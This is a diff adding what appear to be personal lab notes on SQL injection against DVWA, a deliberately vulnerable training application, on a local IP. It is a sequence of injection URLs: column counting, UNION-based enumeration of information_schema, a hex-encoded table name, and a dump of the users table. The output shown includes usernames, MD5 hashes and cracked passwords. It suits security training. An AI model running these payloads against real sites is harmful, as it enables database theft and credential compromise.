@@ -1,0 +1,50 @@
+http://192.168.0.123/dvwa/vulnerabilities/sqli/?id=4'&Submit=Submit#
+
+http://192.168.0.123/dvwa/vulnerabilities/sqli/?id=4' order by 1--+&Submit=Submit#
+http://192.168.0.123/dvwa/vulnerabilities/sqli/?id=4' order by 2--+&Submit=Submit#
+http://192.168.0.123/dvwa/vulnerabilities/sqli/?id=4' order by 3--+&Submit=Submit# XXXXX
+
+no of columns from which the values are being retriieved on page ==2
+
+http://192.168.0.123/dvwa/vulnerabilities/sqli/?id=4' UNION SELECT 1,2--+&Submit=Submit#
+
+user()
+database()
+version()
+
+http://192.168.0.123/dvwa/vulnerabilities/sqli/?id=4' UNION SELECT user(),database()--+&Submit=Submit#
+
+http://192.168.0.123/dvwa/vulnerabilities/sqli/?id=4' UNION SELECT database(),version()--+&Submit=Submit#
+
+http://192.168.0.123/dvwa/vulnerabilities/sqli/?id=4' UNION SELECT group_concat(table_name),2 from information_schema.tables where table_schema=database()--+&Submit=Submit#
+
+http://192.168.0.123/dvwa/vulnerabilities/sqli/?id=4' UNION SELECT group_concat(column_name),2 from information_schema.columns where table_name='users'--+&Submit=Submit#
+
+0x7573657273
+
+http://192.168.0.123/dvwa/vulnerabilities/sqli/?id=4' UNION SELECT group_concat(column_name),2 from information_schema.columns where table_name=0x7573657273--+&Submit=Submit#
+
+user_id,first_name,last_name,user,password
+
+http://192.168.0.123/dvwa/vulnerabilities/sqli/?id=4' UNION SELECT group_concat(user_id,first_name,last_name,user,password),2 from users--+&Submit=Submit#
+
+1adminadminadmin5f4dcc3b5aa765d61d8327deb882cf99,
+2GordonBrowngordonbe99a18c428cb38d5f260853678922e03,
+3HackMe13378d3533d75ae2c3966d7e0d4fcc69216b,
+4PabloPicassopablo0d107d09f5bbe40cade3de5c71e9e9b7,
+5BobSmithsmithy5f4dcc3b5aa765d61d8327deb882cf99
+
+http://192.168.0.123/dvwa/vulnerabilities/sqli/?id=4' UNION SELECT group_concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,user,0x3a,password),2 from users--+&Submit=Submit#
+
+1:admin:admin:admin:5f4dcc3b5aa765d61d8327deb882cf99:password,
+2:Gordon:Brown:gordonb:e99a18c428cb38d5f260853678922e03:abc123,
+3:Hack:Me:1337:8d3533d75ae2c3966d7e0d4fcc69216b:charley,
+4:Pablo:Picasso:pablo:0d107d09f5bbe40cade3de5c71e9e9b7:letmein,
+5:Bob:Smith:smithy:5f4dcc3b5aa765d61d8327deb882cf99:password
+
+
+
+
+
+
+
